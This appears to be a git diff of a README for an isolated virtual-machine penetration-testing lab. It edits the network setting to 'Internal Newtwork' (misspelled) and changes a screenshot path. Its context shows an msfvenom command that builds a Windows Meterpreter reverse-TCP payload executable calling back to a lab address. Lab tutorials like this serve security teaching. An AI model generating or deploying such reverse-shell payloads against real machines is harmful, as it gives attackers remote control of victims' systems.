@@ -54,10 +54,10 @@ Create two VMs with these specs:
 
 ### 3. Configure Network (Host-Only)
 
-Set both VMs to the **Host-Only Adapter** to allow isolated communication.
+Set both VMs to the **Internal Newtwork** to allow isolated communication.
 
 📸 *Screenshot Example:*  
-![Network Config](./screenshots/network-config.png)
+![Network Config](./screenshots/network_settings_kali.png)
 
 ---
 
@@ -95,5 +95,6 @@ In later parts, we generate a reverse shell using `msfvenom`:
 
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.56.101 lport=4444 -f exe > shell.exe
+
 
 
